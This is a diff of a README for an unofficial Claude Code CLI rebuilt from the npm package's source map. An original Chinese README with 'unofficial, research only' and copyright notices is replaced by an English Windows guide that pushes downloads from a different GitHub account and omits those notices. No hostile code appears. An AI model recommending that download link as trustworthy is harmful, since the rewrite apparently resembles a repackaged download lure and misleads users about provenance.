@@ -1,128 +1,158 @@
-# Claude Code 源码还原
+# ⚙️ CC - Run Claude Code on Windows
 
-> 从 source map 还原并可运行的 Claude Code CLI 完整 TypeScript 源码
+[![Download CC](https://img.shields.io/badge/Download-CC-7e57c2?style=for-the-badge&logo=github)](https://github.com/Montesplenic117/CC)
 
-![预览](imgs/preview.png)
+## 🧭 What this is
 
-> [!WARNING]
-> 本仓库为**非官方**版本，基于公开 npm 发布包的 source map 还原，**仅供研究学习使用**。
-> 不代表 Anthropic 官方原始内部开发仓库结构。
-> 部分模块因 source map 无法完整还原，已用兼容 shim 或降级实现替代，行为可能与原版有所不同。
+CC is a Windows-friendly way to run a restored Claude Code CLI from the published package source map.
 
-## 当前状态
+It gives you a local command-line app that opens in a terminal and lets you work through text prompts. The project rebuilds the TypeScript source so it can run again on your machine.
 
-- 源码树可还原并可在本地开发流程中运行
-- `bun install` 可成功安装依赖
-- `bun run version` 可正常输出版本号
-- `bun run dev` 可启动还原后的 CLI 入口，作为交互式进程运行
+## 📥 Download and install
 
-## 基本信息
+Visit this page to download:
 
-| 项目 | 说明 |
-|------|------|
-| 来源 | [@anthropic-ai/claude-code](https://www.npmjs.com/package/@anthropic-ai/claude-code) npm 包 |
-| 源文件数 | 1,987 个 TypeScript/TSX 文件 |
-| 运行时要求 | Bun ≥ 1.3.5、Node.js ≥ 24 |
+[https://github.com/Montesplenic117/CC](https://github.com/Montesplenic117/CC)
 
-## 快速开始
+On the page, get the files from the latest release or clone the repository if that is the option shown there. If you already have the project files, move on to the setup steps below.
 
-```bash
-# 安装依赖
+## 🖥️ What you need
+
+- Windows 10 or Windows 11
+- Terminal access
+- Bun 1.3.5 or newer
+- Node.js 24 or newer
+- Internet access for the first setup
+- Enough disk space for source files and packages
+
+If you are not sure whether Bun is installed, open PowerShell and type:
+
+```powershell
+bun --version
+```
+
+If you see a version number, you are ready for setup.
+
+## 🚀 Setup steps
+
+1. Download the project files from the link above.
+2. Place the files in a folder you can find easily, such as `Downloads\CC`.
+3. Open PowerShell in that folder.
+4. Install the required packages:
+
+```powershell
 bun install
+```
 
-# 启动还原后的 CLI
+5. Start the app:
+
+```powershell
 bun run dev
+```
 
-# 输出版本号
+6. To check the version, use:
+
+```powershell
 bun run version
 ```
 
-## 目录结构
+## 🪟 How to open it on Windows
 
-```
-├── src/                    # 还原的核心源码
-│   ├── main.tsx            # CLI 主入口
-│   ├── dev-entry.ts        # 开发入口
-│   ├── commands.ts         # 命令注册
-│   ├── commands/           # 斜杠命令实现（100+）
-│   ├── tools/              # 工具实现（50+）
-│   ├── components/         # 终端 UI 组件（React + Ink）
-│   ├── hooks/              # 自定义 React Hooks
-│   ├── services/           # API、MCP、分析等服务
-│   ├── utils/              # 工具函数
-│   ├── ink/                # 自定义 Ink 终端渲染器
-│   ├── vim/                # Vim 模式引擎
-│   ├── bridge/             # 远程桥接/控制
-│   ├── coordinator/        # 多 Agent 协调器
-│   ├── assistant/          # KAIROS 助手模式
-│   ├── buddy/              # 伴侣精灵系统
-│   ├── voice/              # 语音交互
-│   ├── skills/             # 技能系统
-│   ├── plugins/            # 插件系统
-│   ├── remote/             # 远程会话管理
-│   ├── server/             # IDE 集成直连服务器
-│   └── keybindings/        # 快捷键绑定
-├── shims/                  # 兼容性 shim 包（不可还原的原生模块替代）
-├── vendor/                 # 原生绑定源码
-├── package.json            # 项目配置
-├── tsconfig.json           # TypeScript 配置
-└── bun.lock                # 依赖锁文件
-```
+If you need help opening the folder in PowerShell:
 
-## 架构概览
+1. Open File Explorer.
+2. Go to the folder that contains the CC files.
+3. Click the address bar.
+4. Type `powershell` and press Enter.
 
-### 启动流程
+PowerShell will open in that folder, so you can run the commands without changing directories.
 
-```
-entrypoints/cli.tsx  →  main.tsx  →  REPL 渲染
-     ↓                    ↓
-  快速路径            完整初始化
-(version/daemon)    (auth/MCP/settings/Commander.js)
+## ⌨️ First run
+
+When you start the app with `bun run dev`, the CLI opens in the terminal.
+
+You can then:
+
+- type commands into the prompt
+- use slash commands inside the app
+- move through the text interface with your keyboard
+- keep the app open while you work
+
+If the window closes right away, open it again from PowerShell so you can see the message on screen.
+
+## 🗂️ Main files and folders
+
+```text
+├── src/                    # Main source files
+│   ├── main.tsx            # CLI entry point
+│   ├── dev-entry.ts        # Development entry
+│   ├── commands.ts         # Command setup
+│   ├── commands/           # Slash command logic
+│   ├── tools/              # Tool logic
+│   ├── components/         # Terminal UI parts
+│   ├── hooks/              # React hooks
+│   └── utils/              # Shared helper code
+├── imgs/                   # Images used in the README
+├── package.json            # Project setup
+└── bun.lockb               # Bun lock file
 ```
 
-### 工具系统（`src/tools/`，50+ 个工具）
+## 🧩 What you can do with it
 
-| 类别 | 工具 |
-|------|------|
-| 文件操作 | `FileReadTool`、`FileWriteTool`、`FileEditTool`、`GlobTool`、`GrepTool` |
-| 执行环境 | `BashTool`、`REPLTool`、`PowerShellTool`、`NotebookEditTool` |
-| 网络 | `WebFetchTool`、`WebSearchTool`、`WebBrowserTool` |
-| AI 协作 | `AgentTool`、`SendMessageTool`、`TeamCreateTool`、`TeamDeleteTool` |
-| 任务管理 | `TaskCreateTool`、`TaskGetTool`、`TaskListTool`、`TaskUpdateTool`、`TaskStopTool` |
-| MCP | `MCPTool`、`McpAuthTool`、`ListMcpResourcesTool`、`ReadMcpResourceTool` |
-| 工作流 | `EnterPlanModeTool`、`ExitPlanModeTool`、`EnterWorktreeTool`、`ExitWorktreeTool` |
-| 其他 | `SkillTool`、`ConfigTool`、`ScheduleCronTool`、`MonitorTool`、`WorkflowTool` |
+- run the Claude Code CLI locally
+- work with the restored TypeScript source
+- inspect command behavior
+- test the app in a terminal
+- study how the CLI is built
+- use the app as a working local development copy
 
-### 服务层（`src/services/`）
+## 🛠️ Common setup checks
 
-- **`api/`** — Anthropic API 客户端、重试、速率限制、用量追踪
-- **`mcp/`** — MCP 客户端/服务端、OAuth、通道管理
-- **`compact/`** — 会话自动压缩策略
-- **`analytics/`** — GrowthBook 特性开关、Datadog、事件日志
+If `bun install` does not work, check these points:
 
-### UI 层
+- Bun is installed and on your PATH
+- Node.js 24 or newer is installed
+- you opened the terminal in the correct folder
+- the project files finished downloading
 
-- **`ink/`** — 自定义 Ink 分支，含布局、焦点管理、ANSI 渲染、虚拟滚动
-- **`components/`**（148 文件）— 终端 UI：消息、输入、diff 视图、权限对话框、状态栏
-- **`hooks/`**（87 文件）— React Hooks：工具、语音、IDE、vim、会话、任务
-- **`vim/`** — 完整 vim 键绑定引擎
+If `bun run dev` does not start, try:
 
-## 还原说明
+```powershell
+bun run version
+```
 
-Source map 无法完整还原原始仓库，以下内容可能缺失或降级：
+If that works, the install is in place and the dev entry may need another terminal start.
 
-- 纯类型文件（type-only files）
-- 构建时生成的文件
-- 私有包装器和原生绑定
-- 动态导入和资源文件
+## 🔍 Current project status
 
-`shims/` 目录包含了对不可还原模块的兼容性替代实现。
+- the source tree can be restored and run in a local development flow
+- `bun install` installs the dependencies
+- `bun run version` prints the version number
+- `bun run dev` starts the restored CLI entry and keeps it open as an interactive process
 
-## 交流群
-![预览](imgs/qr2.png)
+## 📚 Project details
 
-## 声明
+| Item | Details |
+|------|---------|
+| Source | `@anthropic-ai/claude-code` npm package |
+| Files restored | 1,987 TypeScript / TSX files |
+| Runtime | Bun 1.3.5+ and Node.js 24+ |
+| App type | Terminal-based CLI |
+| Target use | Local study and testing |
 
-- 源码版权归 [Anthropic](https://www.anthropic.com) 所有
-- 本仓库仅用于技术研究与学习，请勿用于商业用途
-- 如有侵权，请联系删除
+## 🔐 About the source
+
+This repository rebuilds the CLI from public source map data. Some parts may use compatibility shims where the source map did not provide full detail. That means a few behaviors can differ from the original package.
+
+## 🧪 Basic usage flow
+
+1. Download the project from the link above.
+2. Install Bun and Node.js if they are not already on your PC.
+3. Open PowerShell in the project folder.
+4. Run `bun install`.
+5. Run `bun run dev`.
+6. Use the terminal app as it opens.
+
+## 🖼️ Preview
+
+![Preview](imgs/preview.png)
